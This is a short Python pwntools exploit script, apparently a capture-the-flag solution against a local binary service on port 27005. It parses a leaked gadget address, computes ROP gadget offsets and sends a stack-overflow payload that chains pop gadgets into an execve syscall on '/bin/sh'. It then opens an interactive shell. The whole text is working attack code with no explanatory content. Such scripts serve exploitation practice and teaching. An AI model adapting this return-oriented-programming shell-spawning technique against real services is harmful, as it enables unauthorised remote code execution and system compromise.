from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27005)

p.recvuntil(b"0x")
gadget_addr = int(p.recv(12), 16)
pop_rdi_ret_addr = gadget_addr + 8
pop_rsi_rdx_ret_addr = gadget_addr + 10
syscall_addr = gadget_addr + 13
binsh_addr = gadget_addr + 0x2e67

payload = b"a" * 64 + b"b" * 8 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(
    pop_rsi_rdx_ret_addr) + p64(0) + p64(0) + p64(syscall_addr)
p.send(payload)
pause()
p.send(b"a" * 59)

p.interactive()
